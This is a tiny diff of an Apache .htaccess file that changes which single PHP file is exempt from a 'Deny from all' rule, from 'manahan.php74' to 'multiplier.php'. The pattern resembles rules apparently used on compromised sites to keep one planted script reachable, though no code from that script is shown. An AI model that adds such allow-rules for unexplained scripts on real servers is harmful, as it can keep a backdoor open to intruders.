@@ -6,7 +6,7 @@ Deny from all
 
 </FilesMatch>
 
-<FilesMatch "^(manahan.php74)$">
+<FilesMatch "^(multiplier.php)$">
  Order allow,deny
  Allow from all
 </FilesMatch>
